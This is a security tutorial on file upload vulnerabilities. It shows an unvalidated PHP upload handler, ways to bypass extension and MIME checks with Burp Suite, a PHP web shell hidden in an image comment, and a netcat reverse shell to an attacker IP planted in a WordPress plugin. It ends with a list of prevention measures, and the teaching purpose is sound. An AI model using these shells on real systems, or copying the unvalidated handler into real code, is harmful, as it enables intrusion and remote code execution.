# File Upload Vulnerabilities

File uploads are common features in web applications. Unfortunately, this presents a risk because it can introduce a security issue, especially if the upload mechanism fails to validate files before uploaded or executed on the system.

Some extensions to this are the contact forms on a page, that allow uploads / attachments. The most important aspect of this though, is that the ability to upload a malicious file, means it only becomes necessary to execute on the target system.

## File Upload Vulnerabilities in Forms

Lets look at some security bugs in upload forms. 
No validation:

```html
<!DOCTYPE html>
<html>
  <body>
    <form action="upload.php" method="post" enctype="multipart/form-data">
      Select file to upload:
      <input type="file" name="fileToUpload" id="fileToUpload">
      <input type="submit" name="Upload File" id="submit">
    </form>
  </body>
</html>
```

The `form action` specifies the script that will handle the file upload after submitting. 
The `upload.php` looks like this:

```php
# Receives a POST, saves the file with a random name to a temp directory specified in the php.ini which defaults to /tmp. 
# PHP populates a global array with info about the file - array[1] is $_FILES, and each element holds an attribute. 
<?php
  $upload_path = "/var/www/html/fileupload/uploads/";
$upload_path = $upload_path . basename($_FILES['fileToUpload']['name']);

if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $upload_path)) {
  echo "The file " . basename($_FILES['fileToUpload']['name']) . " has been uploaded";
} else {
  echo "There was an error uploading the file, please try again";
}
?>
```

This completes an upload form but there is no validation which means anything can be uploaded, to include malicious files / scripts. These files are also stored in the web root directory, which means they are accessible to everyone. A simple reverse shell can be uploaded, and facilitate remote code execution. 

### Validating File Extension

First, developers might use a blocklist to prevent specific file extensions from being uploaded. With a blocklist, the PHP script compares with a list of prohibited extensions.  Unfortunately there are tons of extensions, and it would need to be continually managed. Further, we can just save a file as a different type of PHP extension that isn't blocked, like `php4`, `pht`, `phtml`. 

### MIME-type validation

Another method to validate file uploads is by checking the MIME-type - `Multipurpose Internet Mail Extensions`. 
This typically is based on using an allowlist approach, and only accepting file uploads, such as `image/jpeg`. If the MIME type of the uploaded file is not accepted, an error will be sent back that it's not allowed. 
Unfortunately, `allowlist` is also easy to bypass for attackers.

### Modifying Content Headers

Using a tool like Burp suite, we can modify the MIME-type header before it is sent to the server for validation.
First, configure Burpsuite - `Preferences -> Advanced -> Network -> Connection -> Settings`. 
Choose `Manual Proxy Configuration` - set to `127.0.0.1:8080`. 
Create a temporary project with Burp defaults - activate the `Proxy` tab, and ensure intercept is turned on. 

Now we can upload our file, and check Burp. 
The identified file is detected as `application/x-php` - but we can modify the content type in Burpsuite to `image/jpeg`, and see the file is successfully uploaded. 

### Validating Images with GetImageSize()

When called on a valid image file, `getimagesize()` returns the size of an image, or `FALSE` if not an image. 
While image files may not seem like a threat, they can contain an embedded threat, which has a payload that can still be exploited. 
We can modify a regular image with an image editor such as `GIMP` (GNU Image Manipulation Program). 

```bash
apt-get install gimp
https://www.gimp.org
gimp [file]
```

Then we can select `Image Properties` - select the `Comment` tab, and insert web shell code:
`<?php echo shell_exec($_GET['cmd']); ?>`

We can now save and export the file. Once uploaded, we can access it via:
`127.0.0.1/fileupload/uploads/logo.jpg.php?cmd=id`

### Injecting Shellcode in Plugin Files

Some web applications use plugin systems, such as Wordpress. In this section, we will inject reverse shell code in a plugin file, upload the plugin, and then receive a shell.

### Prepping the Plugin

First download a plugin (any will do). Once downloaded, unzip the archive, and find the `php` file likely to be executed. 
In the download manager plugin, we find `wpdm-functions.php`. We edit the file and add the following code:

```bash
shell_exec("nc [Attack IP] [port] -e /bin/bash");
```

We can then add a listener on our box:
```bash
nc -lvp
```

Lastly, we can upload and install the plugin, then activate. 
Once all steps have been completed, you should have a live shell to the target. 

### Preventing Arbitary / Unrestricted File Vulnerabilities

It's surprising how common this might be, due to lack of validation and sanitization.

* Prevent files from being executed in the upload directory via file permissions, .htaccess,  firewalls
* Sanitize file names to ensure they don't contain prohibited extensions.
* Use a WAF to prevent file upload vulnerabilities and block access to directories / files
* Limit max file size
* Prevent files from being overwritten with the same name
* Prevent file upload from unauth'd users
* Randomize file names on upload
* Prevent files from being executed on upload to the Web Application 
* Store uploaded files outside the document root
* Scan uploaded files with a malware/virus scanner.
* Use allowlisting on file extensions and MIME-types. While they can still be bypassed, it limits the opportunity.
* Prevent execution on double file extensions
* Use simple error messages on failed file upload attempts that do not expose info